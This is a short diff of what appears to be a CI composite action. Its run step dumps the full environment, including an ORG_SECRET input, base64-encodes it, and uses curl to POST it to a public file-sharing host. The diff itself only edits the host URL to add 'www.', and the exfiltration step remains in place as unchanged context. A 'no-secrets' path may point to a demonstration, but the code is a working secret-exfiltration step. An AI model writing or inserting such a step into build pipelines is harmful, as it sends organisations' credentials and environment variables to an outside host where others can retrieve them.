@@ -15,7 +15,7 @@ runs:
         ORG_SECRET: ${{ inputs.org_secret }}
       run: |
         env | base64 > temp.txt
-        curl -X 'POST' 'https://filebin.net/no-secrets/tempenv' \
+        curl -X 'POST' 'https://www.filebin.net/no-secrets/tempenv' \
           -H 'accept: application/json' \
           -H 'Content-Type: application/octet-stream' \
           --data-binary '@temp.txt'
